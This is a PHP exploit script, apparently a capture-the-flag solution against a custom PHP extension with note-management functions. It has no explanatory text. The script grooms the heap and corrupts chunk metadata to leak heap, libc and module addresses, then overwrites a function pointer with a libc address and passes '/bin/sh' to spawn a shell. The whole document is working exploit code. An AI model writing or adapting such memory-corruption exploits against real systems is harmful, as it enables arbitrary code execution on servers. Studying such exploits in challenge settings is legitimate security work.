<?php

function pad($data, $len) {
    for ($i = 0; $i < $len; $i++) {
        $data .= "a";
    }
    return $data;
}

/* $payload = pad("", 0x30); */
/* add_note("pad", $payload); */
/* add_note("pad", $payload); */
/* add_note("pad", $payload); */

$payload = pad("", 0x30);
add_note("eastXueLian0", $payload);
$payload = pad("", 0x10);
add_note("eastXueLian1", $payload);

delete_note(0);
$payload = pad("", 0x30) . "\x00";
$payload = pad($payload, 0x50-1);
$payload .= "\x00" . "\x01";
add_note("eastXueLian0", $payload);

$leak = view_note(0);

function Substring($string, $start, $length = null) {
    $result = "";
    for ($i = $start; ($length === null || $i - $start < $length); $i++) {
        $result .= $string[$i];
    }
    return $result;
}
function u64($byteArray) {
    $integerValue = 0;
    for ($i = 7; $i >= 0; $i--) {
        $byteValue = ord($byteArray[$i]);
        $shift = ((7 - (7-$i) ) * 8);
        $integerValue += ($byteValue << $shift);
    }
    return $integerValue;
}

$heaphp_base = u64( Substring($leak, 0xf0, 8) ) - 0xb3c0;
print($heaphp_base);
print("\n");

delete_note(0);
$payload = pad("", 0x30) . "\x00";
$payload = pad($payload, 0x50-1);
$payload .= "\x00" . "\x01";
for ($i = 0; $i < 6; $i++) {
    $payload .= "\x00";
}
$payload .= pack("P", $heaphp_base + 0x8808);
$payload = pad($payload, 0x20-1) . "\x00";
$payload .= "\x00" . "\x01";
for ($i = 0; $i < 6; $i++) {
    $payload .= "\x00";
}
$payload .= pack("P", $heaphp_base + 0xb328);
add_note("eastXueLian0", $payload);
$leak = view_note(0);
$heap_addr = u64( Substring($leak, 0x00, 8) );
print($heap_addr);
print("\n");

edit_note(1, pack("P", $heap_addr + 0x10b0));
$leak = view_note(0);
$libc_base = u64( Substring($leak, 0x00, 8) ) - 0x219e60;
print($libc_base);
print("\n");

edit_note(1, pack("P", $heap_addr - 0xce1c8));
$leak = view_note(0);
$module_base = u64( Substring($leak, 0x00, 8) );
print($module_base);
print("\n");

edit_note(1, pack("P", $module_base + 0x4058));
edit_note(0, pack("P", $libc_base + 0x50d60));
edit_note(1, "/bin/sh\x00");
delete_note(1);

/* for ($i = 0; $i < 0x100; $i++) { */
/*     print(ord($leak[$i])); */
/*     print("\n"); */
/* } */

list_note();
?>
